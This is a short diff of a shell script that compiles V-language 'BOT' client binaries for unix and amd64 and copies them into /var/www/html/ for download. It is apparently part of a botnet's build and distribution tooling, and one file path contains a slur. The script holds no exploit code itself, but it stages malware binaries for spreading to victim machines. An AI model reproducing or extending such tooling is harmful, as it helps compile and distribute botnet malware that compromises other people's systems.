@@ -1,5 +1,6 @@
-client_file="client.v"
-compiled_file="client"
+#!/bin/sh
+client_file="/root/fag/client.v"
+compiled_file="/root/fag/client"
 # Compile normal unix BOT => /var/www/html/unix
 /bin/v/v $client_file; cp $compiled_file unix; mv unix /var/www/html/
 # Compile amd64 BOT => /var/www/html/amd64
